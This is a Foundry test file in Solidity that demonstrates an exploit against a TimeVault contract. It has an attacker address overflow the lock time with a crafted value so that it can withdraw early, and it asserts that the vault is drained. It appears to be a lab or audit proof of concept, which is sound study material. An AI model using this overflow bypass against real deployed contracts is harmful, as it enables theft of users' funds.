// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "../src/TimeVault.sol";

contract TimeVaultTest is Test {
    TimeVault private vault;
    address attacker = address(0x1337);

    function setUp() external {
        vault = new TimeVault();
        vm.deal(address(vault), 10 ether);
    }

    function testExploitTimeLock() external {
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        vault.deposit{value: 1}();

        uint256 secondsToOverflow = type(uint256).max - (block.timestamp + 1 weeks) + 1;

        vault.increaseLockTime(secondsToOverflow);

        vault.withdraw();

        assertEq(address(vault).balance, 0);
        console.log("Attacker balance after exploit:", attacker.balance);
        vm.stopPrank();
    }
    receive() external payable {}
}
